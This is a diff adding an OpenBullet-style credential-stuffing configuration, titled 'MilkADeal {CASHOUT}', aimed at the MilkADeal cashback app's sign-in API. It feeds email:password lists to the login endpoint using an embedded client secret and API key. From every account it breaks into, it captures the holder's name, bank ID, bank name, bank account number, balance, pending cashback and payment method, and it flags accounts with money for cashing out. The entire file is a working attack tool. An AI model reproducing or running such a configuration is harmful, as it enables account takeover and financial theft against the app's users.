@@ -1,0 +1,88 @@
+[SETTINGS]
+{
+  "Name": "MilkADeal {CASHOUT}",
+  "SuggestedBots": 499,
+  "MaxCPM": 0,
+  "LastModified": "2021-10-18T00:10:27.2447145-07:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "@MasterLord007",
+  "Version": "1.0.1 [CB]",
+  "Descriptions": "",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#LOGIN REQUEST POST "https://api.milkadeal.com/api/v2/signin" 
+  CONTENT "{\"client_id\":\"4\",\"client_secret\":\"KcZud5xnsPm2mft7klKOcoZld5LtOZV9s5NmKSPi\",\"grant_type\":\"password\",\"platform\":\"ios\",\"origin\":\"app\",\"uuid\":\"8878678e-06fe-4fe8-bb4a-c718f660fd2d\",\"app_version\":1.3,\"getUnreadNotifications\":1,\"username\":\"<USER>\",\"password\":\"<PASS>\",\"api_key\":\"bWlsa2FkZWFsLWFwcC1teTo2ckVHRTNBR1VTd3VEZWRSZWthU3RVNWF0M2EzZW00Yw==\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: api.milkadeal.com" 
+  HEADER "Content-Type: application/json;charset=utf-8" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Accept: application/json" 
+  HEADER "User-Agent: Milkadeal/39 CFNetwork/978.0.7 Darwin/18.7.0" 
+  HEADER "Content-Length: 362" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "Accept-Encoding: br, gzip, deflate" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "\"status\":false" 
+  KEYCHAIN Success OR 
+    KEY "\"status\":true" 
+
+#NAME PARSE "<SOURCE>" JSON "realName" CreateEmpty=FALSE -> CAP "Name" 
+
+#PRO_USER PARSE "<SOURCE>" LR "pro_user\":" "," CreateEmpty=FALSE -> CAP "Pro User" 
+
+#BANK_ID PARSE "<SOURCE>" LR "bankId\":" "," CreateEmpty=FALSE -> CAP "Bank ID" 
+
+#BANK_NAME PARSE "<SOURCE>" LR "bankName\":" "," CreateEmpty=FALSE -> CAP "Bank Name" 
+
+#BANK_NUMBER PARSE "<SOURCE>" LR "bankAccountNo\":" "," CreateEmpty=FALSE -> CAP "Bank Number" 
+
+#BALANCE PARSE "<SOURCE>" LR "lifetime\":" "," CreateEmpty=FALSE -> CAP "Balance" 
+
+#PENDING PARSE "<SOURCE>" LR "cashback\":{\"pending\":" "," CreateEmpty=FALSE -> CAP "Pending" 
+
+#PAYMENT PARSE "<SOURCE>" LR "paymentMethod\":" "," CreateEmpty=FALSE -> CAP "Payment Method" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "\"summary\":{\"lifetime\":0" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "\"summary\":{\"lifetime\":0" 
+
+#CREATOR FUNCTION Constant "@MasterLord007" -> CAP "Config By" 
+
